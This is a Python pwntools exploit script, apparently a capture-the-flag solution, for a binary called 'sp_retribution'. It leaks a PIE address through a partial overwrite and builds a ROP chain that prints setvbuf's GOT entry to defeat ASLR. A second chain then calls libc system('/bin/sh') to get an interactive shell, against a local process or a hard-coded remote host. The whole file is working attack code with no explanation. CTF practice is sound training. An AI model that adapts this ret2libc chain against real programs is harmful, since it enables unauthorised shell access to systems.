from pwn import *

gs = '''
continue
'''

elf = context.binary = ELF("./sp_retribution")
libc = ELF('./glibc/libc.so.6')

def start():
    if args.REMOTE:
        return remote("83.136.252.167", 40382)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']

io = start()

io.sendlineafter(">> ", "2A".encode())

offset = 30

payload = b"".join([
    b"\x41"*offset,
    b"\x9f"
])

io.sendafter("= ", payload)
io.recvuntil("[*] New coordinates: x = [0x53e5854620fb399f], y =")
io.recvline()
leak = u64(io.recvline().strip().ljust(8, b"\x00"))
main_leak_address = int(hex(leak) + "0c39", 16)

print(f"[+] {hex(main_leak_address)}")

pie = main_leak_address - elf.symbols['main']

elf.address = pie

rop = ROP(elf)

ret_gadget = rop.find_gadget(['ret'])[0]
pop_rdi_gadget = rop.find_gadget(['pop rdi'])[0]

print(f"RET Gadget: {hex(ret_gadget)}")
print(f"POP RDI Gadget: {hex(pop_rdi_gadget)}")

other_offset = 88

#print(elf.got)
#print(elf.plt)

payload = b"".join([
    b"\x41"*other_offset,
    p64(pop_rdi_gadget),
    p64(elf.got.setvbuf),
    p64(elf.plt.puts),
    p64(elf.symbols['main'])
])

io.sendlineafter(">> ", "2".encode())
io.sendlineafter("y = ", "123".encode())
io.sendlineafter(": ", payload)
#io.recvuntil("[-] Permission Denied! You need flag.txt in order to proceed. Coordinates have been reset!")
io.recvuntil(b"reset")
io.recv(9)

setvbuf_libc_leak = u64(io.recv(7).strip().ljust(8, b"\x00"))

print("[+] Setvbuf: ", hex(setvbuf_libc_leak))

libc.address = setvbuf_libc_leak - libc.symbols.setvbuf

payload = b"".join([
    b"\x41"*other_offset,
    p64(pop_rdi_gadget),
    p64(next(libc.search(b'/bin/sh'))),
    p64(ret_gadget),
    p64(libc.symbols.system)
])

io.sendlineafter(">> ", "2".encode())
io.sendlineafter("y = ", "AA".encode())
io.sendlineafter(": ", payload)

io.interactive()
